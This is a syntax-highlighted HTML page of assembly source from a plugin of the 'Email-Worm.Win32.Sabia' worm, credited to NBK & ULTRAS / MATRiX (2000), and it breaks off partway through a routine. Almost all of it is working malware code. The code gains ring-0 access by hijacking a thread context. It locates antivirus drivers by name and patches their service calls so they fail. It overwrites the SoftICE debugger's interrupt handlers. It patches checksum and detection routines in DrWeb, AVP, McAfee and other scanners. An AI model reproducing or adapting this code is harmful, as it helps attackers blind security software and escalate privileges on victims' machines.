<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Sabia - _anti-av.INC.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">   </span><span class="sc1">; </span><span class="sc0">
   </span><span class="sc1">; Trojan/W32/I-Worm.SABi¡ II</span><span class="sc0">
   </span><span class="sc1">; </span><span class="sc0">
   </span><span class="sc1">; by NBK &amp; ULTRAS / MATRiX</span><span class="sc0">
   </span><span class="sc1">; (c) 2000</span><span class="sc0">

   </span><span class="sc1">; Plugin       : ring-0 entering plugin + kill AV vxd + kill SoftICE</span><span class="sc0">
   </span><span class="sc1">; Version      : 1.2</span><span class="sc0">
   </span><span class="sc1">; Date release : 1 november</span><span class="sc0">

   </span><span class="sc1">; THANX Z0MBiE</span><span class="sc0">

   </span><span class="sc5">ring0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; ring0 c0de</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">KillAVXD</span><span class="sc0"> </span><span class="sc1">; AV VxDs killer</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SoftICE</span><span class="sc0">  </span><span class="sc1">; soft-ice fuckup extension</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">SoftICE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">; - soft-ice fuckup extension</span><span class="sc0">
   </span><span class="sc6">pusha</span><span class="sc0">

   </span><span class="sc6">sidt</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; int 01h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fint</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; int 03h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fint</span><span class="sc0">

   </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">

   </span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">                 
   </span><span class="sc6">popa</span><span class="sc0">
   </span><span class="sc6">stc</span><span class="sc0">  </span><span class="sc1">; let others use this event too</span><span class="sc0">
   </span><span class="sc6">retn</span><span class="sc0">

   </span><span class="sc5">fint</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">68h</span><span class="sc0">     </span><span class="sc1">; softice signature</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">__skip</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">  </span><span class="sc1">; -//-</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">__skip</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0CFh</span><span class="sc0">    </span><span class="sc1">; iret   8-( )</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc5">__skip</span><span class="sc4">:</span><span class="sc0">                
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">KillAVXD</span><span class="sc4">:</span><span class="sc0">               
   </span><span class="sc6">pusha</span><span class="sc0">
   </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">VXDLDR</span><span class="sc4">,</span><span class="sc5">GetDeviceList</span><span class="sc0">

   </span><span class="sc5">scan@vxd</span><span class="sc4">:</span><span class="sc0">        
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0C0000000h</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Name_0</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,-</span><span class="sc12">'DIPS'</span><span class="sc0">   </span><span class="sc1">; SPIDER</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@patchit</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,-</span><span class="sc12">'9PVA'</span><span class="sc0">   </span><span class="sc1">; AVP95</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@patchit</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'GPVA'</span><span class="sc0">   </span><span class="sc1">; AVPGUARD</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@patchit</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,-</span><span class="sc12">'59KG'</span><span class="sc0">   </span><span class="sc1">; GK95</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@patchit</span><span class="sc0">

   </span><span class="sc5">continue</span><span class="sc4">:</span><span class="sc0">       
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">scan@vxd</span><span class="sc0">

   </span><span class="sc6">popa</span><span class="sc0">
   </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; let others use this event too</span><span class="sc0">
   </span><span class="sc6">retn</span><span class="sc0">

   </span><span class="sc5">@patchit</span><span class="sc4">:</span><span class="sc0">          
   </span><span class="sc6">pusha</span><span class="sc0">

   </span><span class="sc5">pusho</span><span class="sc0"> </span><span class="sc5">kavxd_kill_moveax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000D500h</span><span class="sc0">     </span><span class="sc1">; R0_OPENCREATFILE</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">killz</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000D501h</span><span class="sc0">     </span><span class="sc1">; R0_OPENCREAT_IN_CONTEXT</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">killz</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">;  avpguard</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">__skip1</span><span class="sc0">

</span><span class="sc1">;  mov eax, 1+1Bh          ; unload vxd</span><span class="sc0">
</span><span class="sc1">;  call dword ptr [ebx+18h] ; control_proc_0</span><span class="sc0">

   </span><span class="sc5">pusho</span><span class="sc0"> </span><span class="sc5">kavxd_kill_cd20</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002A001Ah</span><span class="sc0">     </span><span class="sc1">; VWIN32_SysErrorBox</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">killz</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002A000Eh</span><span class="sc0">     </span><span class="sc1">; VWIN32_SetWin32Event</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">killz</span><span class="sc0">

   </span><span class="sc5">pusho</span><span class="sc0"> </span><span class="sc5">kavxd_kill_badcall</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">002Ah</span><span class="sc0"> </span><span class="sc1">; VMM</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">Get_DDB</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; DDB_Service_Table_Ptr</span><span class="sc0">

   </span><span class="sc1">; LEA, but not MOV !</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">001Ah</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; VWIN32_SysErrorBox</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">killz</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">000Eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; VWIN32_SetWin32Event</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">killz</span><span class="sc0">

   </span><span class="sc5">__skip1</span><span class="sc4">:</span><span class="sc0">                
   </span><span class="sc6">popa</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc0">

   </span><span class="sc5">killz</span><span class="sc4">:</span><span class="sc0">          
   </span><span class="sc6">pusha</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Control_Proc_0</span><span class="sc0">

   </span><span class="sc5">kavxd@1</span><span class="sc4">:</span><span class="sc0">              
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; check presence for</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000FFFh</span><span class="sc0">  </span><span class="sc1">; each new page encountered</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">kavxd@2</span><span class="sc0">

   </span><span class="sc6">pusha</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; esi = MEMORY_BASIC_INFO</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">VMM</span><span class="sc4">,</span><span class="sc5">PageQuery</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc1">; mbi_state &amp; MEM_COMMIT</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">popa</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">kavxd@2</span><span class="sc0">

   </span><span class="sc6">popa</span><span class="sc0">
   </span><span class="sc6">retn</span><span class="sc0">

   </span><span class="sc5">kavxd@2</span><span class="sc4">:</span><span class="sc0">              
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">; &lt;esi&gt;</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">kavxd@1</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">kavxd@1</span><span class="sc0">

   </span><span class="sc5">kavxd_kill_moveax</span><span class="sc4">:</span><span class="sc0">      
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0B8h</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">rt</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; R0_xxx &lt;-- 0xFFFFFFFF</span><span class="sc0">
   </span><span class="sc6">retn</span><span class="sc0">

   </span><span class="sc5">kavxd_kill_cd20</span><span class="sc4">:</span><span class="sc0">        
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">20CDh</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">rt</span><span class="sc0">

   </span><span class="sc5">kavxd_kill_both</span><span class="sc4">:</span><span class="sc0">        
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0B890h</span><span class="sc0">  </span><span class="sc1">; nop/mov eax, 1</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">retn</span><span class="sc0">

   </span><span class="sc5">kavxd_kill_badcall</span><span class="sc4">:</span><span class="sc0">     
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">15FFh</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">kavxd_kill_both</span><span class="sc0">
   </span><span class="sc5">rt</span><span class="sc4">:</span><span class="sc0">                     
   </span><span class="sc6">retn</span><span class="sc0">

   </span><span class="sc1">; call ring0 procedure</span><span class="sc0">

   </span><span class="sc5">callring0</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pusha</span><span class="sc0">
   </span><span class="sc6">enter</span><span class="sc0"> </span><span class="sc2">0C8h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetCurrentThread</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetThreadContext</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0BCh</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_save_cs</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ring0code_caller</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0B8h</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_save_eip</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_SetThreadContext</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">leave</span><span class="sc0">
   </span><span class="sc6">popa</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">ring0code_caller</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">_save_esp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">end_of_my_stack</span><span class="sc0">

   </span><span class="sc6">pushf</span><span class="sc0">
   </span><span class="sc6">pusha</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ring0</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
   </span><span class="sc6">popa</span><span class="sc0">
   </span><span class="sc6">popf</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">_save_esp</span><span class="sc0">

   </span><span class="sc6">pushf</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">_save_cs</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">_save_eip</span><span class="sc0">
   </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; AAV -- Anti-Anti-Virus -- (x) 2000</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   antivirus:  crack subject:</span><span class="sc0">
</span><span class="sc1">;   ~~~~~~~~~   ~~~~~~~~~~~~~</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ˛ DRWEB       std-csum</span><span class="sc0">
</span><span class="sc1">; ˛ AVP         lancrypto-csum, std-csum, .avc csum checking</span><span class="sc0">
</span><span class="sc1">; ˛ MACAFE      virus-detection, self-check</span><span class="sc0">
</span><span class="sc1">; ˛ NAV         virus-detection</span><span class="sc0">
</span><span class="sc1">; ˛ ADINF       crc16/32/48             ; ´„ÁË• ≠•¨≠Æ£Æ £´Ó™Æ¢,</span><span class="sc0">
</span><span class="sc1">; ˛ AVPI        crc32, boot-warning     ; Á•¨ ¢·Ô™®• ¢†‡≠®≠£®.</span><span class="sc0">
</span><span class="sc1">;   ...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; subroutine: patch_buffer</span><span class="sc0">
</span><span class="sc1">; action:     find suckin antiviral code and patch it</span><span class="sc0">
</span><span class="sc1">; input:      ESI=buffer (the whole file, as a rule)</span><span class="sc0">
</span><span class="sc1">;             ECX=size</span><span class="sc0">
</span><span class="sc1">; output:     EAX=# of changed bytes</span><span class="sc0">
</span><span class="sc1">; comment:    all crks are made offset-independent</span><span class="sc0">
</span><span class="sc1">;             to support as much av-versions as possible</span><span class="sc0">

</span><span class="sc5">popa_eax</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc4">(</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">patch_buffer</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E230D630h</span><span class="sc0"> </span><span class="sc1">; WEB</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch1</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05B9C245Eh</span><span class="sc0"> </span><span class="sc1">; AVP</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch2</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C233D333h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch3</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C83B08C4h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch4</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002C08789h</span><span class="sc0"> </span><span class="sc1">; MACAFE</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch5</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001FC45C7h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch6</span><span class="sc0">

